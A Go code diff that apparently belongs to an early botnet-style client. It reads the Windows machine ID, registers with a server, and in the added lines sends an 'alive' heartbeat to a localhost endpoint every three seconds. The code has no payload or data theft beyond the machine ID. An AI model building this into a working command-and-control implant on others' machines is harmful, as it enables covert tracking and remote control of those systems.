@@ -3,11 +3,11 @@ package main
 import (
 	"bytes"
 	"encoding/json"
-	"fmt"
 	"golang.org/x/sys/windows/registry"
 	"log"
 	"net/http"
 	"strings"
+	"time"
 )
 
 type bot struct {
@@ -27,7 +27,7 @@ func getmachineid() string {
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println(s2)
+	//fmt.Println(s2)
 
 	return s2
 }
@@ -47,6 +47,30 @@ func register() {
 	if err != nil {
 		log.Fatalf("An Error Occured %v", err)
 	}
+
+	//fmt.Println(resp)
+
+	defer resp.Body.Close()
+}
+
+func heartbeat() {
+	idnum := getmachineid()
+
+	b := bot{
+		Id:     idnum,
+		Status: "alive",
+	}
+
+	postBody, _ := json.Marshal(b)
+
+	resp, err := http.Post("http://127.0.0.1:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
+	//Handle Error
+	if err != nil {
+		log.Fatalf("An Error Occured %v", err)
+	}
+
+	//fmt.Println(resp)
+
 	defer resp.Body.Close()
 }
 
@@ -54,7 +78,8 @@ func main() {
 
 	register()
 
-	//for true {
-	//	//time.Sleep(3*time.Second)
-	//}
+	for true {
+		time.Sleep(3 * time.Second)
+		heartbeat()
+	}
 }
